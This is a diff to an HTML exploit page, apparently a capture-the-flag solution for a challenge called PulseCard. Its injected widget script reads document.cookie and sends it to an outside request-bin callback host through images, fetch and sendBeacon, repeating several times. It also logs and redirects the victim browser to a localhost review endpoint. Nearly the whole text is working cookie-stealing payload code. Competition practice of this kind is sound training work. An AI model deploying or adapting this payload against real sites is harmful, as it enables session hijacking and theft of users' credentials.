@@ -2,20 +2,62 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PulseCard Exploit</title>
+  <title>PulseCard Exploit Final Debug</title>
 </head>
 <body>
-  <h1>PulseCard exploit</h1>
+  <h1>PulseCard exploitt</h1>
 
   <iframe id="box" sandbox="allow-scripts" style="display:none"></iframe>
 
   <script>
-  const CALLBACK = "https://aisphuk.request.dreamhack.games";
+  const CALLBACK = "https://aptounc.request.dreamhack.games";
 
   new Image().src = CALLBACK + "/loaded?t=" + Date.now();
 
-  const widgetJS =
-    `(new Image()).src=${JSON.stringify(CALLBACK)}+"/cookie?c="+encodeURIComponent(document.cookie)+"&t="+Date.now();`;
+  const widgetJS = `
+    (() => {
+      const C = ${JSON.stringify(CALLBACK)};
+      const send = (path, data) => {
+        const u = C + path + "?d=" + encodeURIComponent(data) + "&t=" + Date.now();
+
+        try {
+          window.__imgs = window.__imgs || [];
+          const i = new Image();
+          i.src = u;
+          window.__imgs.push(i);
+        } catch (e) {}
+
+        try {
+          fetch(u + "&m=fetch", {
+            mode: "no-cors",
+            keepalive: true
+          }).catch(() => {});
+        } catch (e) {}
+
+        try {
+          navigator.sendBeacon(u + "&m=beacon");
+        } catch (e) {}
+      };
+
+      send("/widget-loaded", location.href);
+
+      let c = "";
+      try {
+        c = document.cookie || "";
+      } catch (e) {
+        c = "cookie-error:" + String(e);
+      }
+
+      send("/cookie", c);
+
+      let n = 0;
+      const timer = setInterval(() => {
+        n++;
+        send("/cookie-repeat-" + n, document.cookie || "");
+        if (n >= 8) clearInterval(timer);
+      }, 500);
+    })();
+  `;
 
   const stage2 =
     `(async()=>{try{` +
@@ -43,8 +85,19 @@
       Date.now();
 
     if (d.t === "stage" && d.s === 200 && /^[A-Za-z0-9_-]+\.js$/.test(d.x)) {
-      location.href =
+      const target =
         "http://localhost:5000/review?widget=" + encodeURIComponent(d.x);
+
+      new Image().src =
+        CALLBACK +
+        "/nav?to=" +
+        encodeURIComponent(target) +
+        "&t=" +
+        Date.now();
+
+      setTimeout(() => {
+        location.replace(target);
+      }, 500);
     }
   });
 
